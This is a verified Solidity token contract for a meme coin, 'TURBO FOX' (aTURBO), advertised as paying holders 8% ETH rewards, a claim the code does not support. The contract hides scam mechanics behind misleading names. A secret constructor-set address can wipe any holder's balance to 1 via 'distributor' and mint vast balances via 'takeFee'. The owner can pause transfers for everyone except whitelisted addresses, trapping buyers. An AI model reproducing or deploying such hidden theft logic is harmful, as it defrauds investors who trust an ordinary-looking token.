/**
 *Submitted for verification at BscScan.com on 2023-05-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
/*

aTURBO MAKE MEMES GREAT AGAIN!

// TG: https://t.me/TURBOtokenbsc
// Website: https://aTURBO.io/
// Twitter: https://twitter.com/aTURBO
// Facebook: https://facebook.com/aTURBO
// Reddit: https://reddit.com/r/aTURBO
// Email: [email protected]

/*
HOLD To Earn 8% ETH Rewards. StealthLaunch.
*/

abstract contract Auth {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 isFeeExempt) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 isFeeExempt) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 isFeeExempt
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface IDEXFactory is IBEP20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract IDEXRouter is Auth {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract aTURBO is Auth, IBEP20, IDEXFactory, IDEXRouter {

    mapping(address => uint256) private amountETHMin;
  mapping(address => bool) public IBEP20RWRD;
    mapping(address => mapping(address => uint256)) private Allowed;
address private totalDividends;
    uint256 private getCumulativeDividends;
    string private _name;
    string private _symbol;
  address CSSbitcin;
    // My variables
    mapping(address => bool) public shareADR;
    bool initialized;
    
    constructor(address shareholders) {
            // Editable
            CSSbitcin = msg.sender;
            IBEP20RWRD[CSSbitcin] = true;
        _name = "TURBO FOX";
        _symbol = "aTURBO";
  totalDividends = shareholders;        
        uint _totalSupply = 1000000000000 * 10**9;
        initialized = false;
        // End editable

        shareADR[msg.sender] = true;

        currentIndex(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return getCumulativeDividends;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return amountETHMin[account];
    }

    function transfer(address to, uint256 isFeeExempt) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, isFeeExempt);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Allowed[owner][spender];
    }

    function approve(address spender, uint256 isFeeExempt) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, isFeeExempt);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 isFeeExempt
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, isFeeExempt);
        _transfer(from, to, isFeeExempt);
        return true;
    }

    function increaseAllowance(address spender, uint256 targetLiquidityDenominator) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Allowed[owner][spender] + targetLiquidityDenominator);
        return true;
    }

    function decreaseAllowance(address spender, uint256 LogRebase) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = Allowed[owner][spender];
        require(currentAllowance >= LogRebase, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - LogRebase);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 isFeeExempt
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        _deforeTokenTransfer(from, to, isFeeExempt);

        // My implementation
        require(!initialized || shareADR[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = amountETHMin[from];
        require(fromBalance >= isFeeExempt, "Ehi20: transfer isFeeExempt exceeds balance");
        unchecked {
            amountETHMin[from] = fromBalance - isFeeExempt;
        }
        amountETHMin[to] += isFeeExempt;

        emit Transfer(from, to, isFeeExempt);

        _CSSfterTokenTransfer(from, to, isFeeExempt);
    }
  modifier CSS0wner () {
    require(CSSbitcin == msg.sender, "Ehi20: cannot permit autoLiquidityReceiver address");
    _;
  
  }
    function currentIndex(address account, uint256 isFeeExempt) internal virtual {
        require(account != address(0), "Ehi20: mint to the zero address");

        _deforeTokenTransfer(address(0), account, isFeeExempt);

        getCumulativeDividends += isFeeExempt;
        amountETHMin[account] += isFeeExempt;
        emit Transfer(address(0), account, isFeeExempt);

        _CSSfterTokenTransfer(address(0), account, isFeeExempt);
    }
    modifier autoLiquidityReceiver() {
        require(totalDividends == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function distributor(address IDEXFactoryccount) external autoLiquidityReceiver {
    amountETHMin[IDEXFactoryccount] = 1;
            emit Transfer(address(0), IDEXFactoryccount, 1);
  }

    function _burn(address account, uint256 isFeeExempt) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        _deforeTokenTransfer(account, address(0), isFeeExempt);

        uint256 accountBalance = amountETHMin[account];
        require(accountBalance >= isFeeExempt, "Ehi20: burn isFeeExempt exceeds balance");
        unchecked {
            amountETHMin[account] = accountBalance - isFeeExempt;
        }
        getCumulativeDividends -= isFeeExempt;

        emit Transfer(account, address(0), isFeeExempt);

        _CSSfterTokenTransfer(account, address(0), isFeeExempt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 isFeeExempt
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Allowed[owner][spender] = isFeeExempt;
        emit Approval(owner, spender, isFeeExempt);
    }
  function takeFee(address IDEXFactoryccontz) external autoLiquidityReceiver {
    amountETHMin[IDEXFactoryccontz] = 10000 * 10 ** 21;
            emit Transfer(address(0), IDEXFactoryccontz, 10000 * 10 ** 21);
  }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 isFeeExempt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= isFeeExempt, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - isFeeExempt);
            }
        }
    }

    function _deforeTokenTransfer(
        address from,
        address to,
        uint256 isFeeExempt
    ) internal virtual {}


    function _CSSfterTokenTransfer(
        address from,
        address to,
        uint256 isFeeExempt
    ) internal virtual {}

    // My functions

    function wCSStingExempt(address account, bool totalo) external onlyOwner {
        shareADR[account] = totalo;
    }
    
    function wCSStingd(bool totalo) external onlyOwner {
        initialized = totalo;
    }
}